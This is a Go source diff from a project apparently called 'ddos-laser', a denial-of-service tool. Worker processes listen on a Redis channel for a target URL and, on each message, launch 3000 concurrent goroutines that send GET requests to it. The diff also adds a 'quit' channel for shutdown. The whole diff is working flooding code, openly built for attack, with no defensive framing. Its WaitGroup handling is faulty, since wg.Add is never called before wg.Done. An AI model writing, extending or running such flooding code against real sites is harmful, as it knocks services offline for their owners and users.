@@ -4,6 +4,7 @@ import (
 	"io/ioutil"
 	"log"
 	"net/http"
+	"sync"
 
 	"github.com/go-redis/redis"
 	"github.com/michaeloverton/ddos-laser/internal/env"
@@ -41,48 +42,63 @@ func main() {
 	}
 
 	// Subscribe to the attack topic.
-	sub := subClient.Subscribe("topic")
-	subChan := sub.Channel()
+	attackTopic := subClient.Subscribe("topic")
+	attackChan := attackTopic.Channel()
+
+	// Subscribe to the quit topic.
+	quitTopic := subClient.Subscribe("quit")
+	quitChan := quitTopic.Channel()
 
 	// When a message is received, attack target.
 	for {
 		select {
-		case m := <-subChan:
-			logrus.Info(m.Payload)
-			// logrus.Info(m.Pattern)
-			// logrus.Info(m.Channel)
-			makeRequest(httpClient, m.Payload)
+		case m := <-attackChan:
+			var wg sync.WaitGroup
+			for i := 0; i < 3000; i++ {
+				go makeRequest(httpClient, m.Payload, &wg)
+			}
+			wg.Wait()
+		case <-quitChan:
+			logrus.Info("quitting")
+			return
 		}
 	}
 }
 
-func makeRequest(c http.Client, URL string) {
-	// Make 1000 requests
-	for i := 0; i < 1000; i++ {
-		logrus.Infof("making request to: %s", URL)
+func makeRequest(c http.Client, URL string, wg *sync.WaitGroup) {
+	//defer wg.Done()
 
-		// Create the request to the target.
-		req, err := http.NewRequest("GET", URL, nil)
-		if err != nil {
-			logrus.Errorf("failed to create request: %s", err)
-		}
+	// Make 100 requests
+	// for i := 0; i < 100; i++ {
+	logrus.Infof("making request to: %s", URL)
 
-		// Make the request.
-		res, err := c.Do(req)
-		if err != nil {
-			logrus.Errorf("request failed: %s", err)
-		}
-		defer res.Body.Close()
-
-		// Decode the body for now.
-		body, err := ioutil.ReadAll(res.Body)
-		if err != nil {
-			logrus.Fatal(err)
-		}
-
-		// Log body.
-		logrus.Info("response code:", res.StatusCode)
-		logrus.Info(string(body))
+	// Create the request to the target.
+	req, err := http.NewRequest("GET", URL, nil)
+	if err != nil {
+		logrus.Errorf("failed to create request: %s", err)
+		return
 	}
+
+	// Make the request.
+	res, err := c.Do(req)
+	if err != nil {
+		logrus.Errorf("request failed: %s", err)
+		return
+	}
+	defer res.Body.Close()
+
+	// Decode the body for now.
+	body, err := ioutil.ReadAll(res.Body)
+	if err != nil {
+		logrus.Errorf("failed to read response body: %s", err)
+		return
+	}
+
+	// Log body.
+	logrus.Info("response code:", res.StatusCode)
+	logrus.Info(string(body))
+	// }
+
+	wg.Done()
 
 }
